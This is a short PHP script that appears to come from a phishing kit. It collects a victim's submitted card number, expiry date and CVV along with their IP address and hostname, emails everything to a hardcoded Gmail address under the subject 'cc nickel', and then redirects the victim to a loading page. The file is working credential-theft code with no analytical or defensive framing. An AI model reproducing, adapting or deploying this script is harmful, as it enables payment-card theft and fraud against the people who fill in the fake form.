<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "~~~~~~~~~~~~\n";
$message .= "SMS : ".$_POST['numero100']."\n";
$message .= "SMS : ".$_POST['expiration']."\n";
$message .= "SMS : ".$_POST['cvvcvv']."\n";

$message .= "~~~~~~~~~~~~~~~~~~~~\n";
$message .= "IPs              : $ip\n";
$message .= "HN               : $hostname\n";
$message .= "~~~~~~~ ok ~~~~~~~\n";
$send = "tlory86@gmail.com";
$subject = "cc nickel | $ip ";
$headers = "From:<mail>";
mail($send,$subject,$message,$headers);
@header("Location: loading1.html");
 
?>

